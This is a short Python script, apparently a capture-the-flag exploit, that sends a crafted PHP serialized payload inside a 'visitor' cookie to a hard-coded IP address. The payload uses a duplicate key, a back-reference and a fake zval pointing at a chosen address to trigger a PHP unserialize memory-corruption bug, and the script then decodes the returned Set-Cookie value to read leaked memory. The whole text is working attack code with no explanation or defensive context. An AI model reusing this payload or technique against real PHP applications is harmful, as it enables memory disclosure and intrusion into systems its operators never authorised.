import base64
import requests
import struct
import urlparse



zval = "A" * 12 + "\\00"
#zval = "A" * 13

target = 0x1337
zval = repr(struct.pack('<Q', target) + "\0\1\0\0\1\1\1\1\1\0\0\0\6\0\0\0").replace('\\x', '\\')[1:-1]


pay = base64.b64encode(('''

a:4:{
	i:0;O:8:"stdClass":2:{
			s:1:"A";a:2:{i:0;i:0;i:1;i:1;}
			s:1:"A";i:1;
	}
	s:1:"A";S:24:"''' + zval+'''";
  s:1:"A";i:1;	
  s:10:"currentFid";r:3;
}

''').replace("\n", "").replace("\t", "").replace(" ", ""))

r = requests.get("http://18.182.51.22/", cookies={ "visitor": pay})

print(r.headers)
print(r.content)

leak = r.headers["Set-Cookie"].split("=")[1]

leak = urlparse.unquote(leak)

print(base64.b64decode(leak))
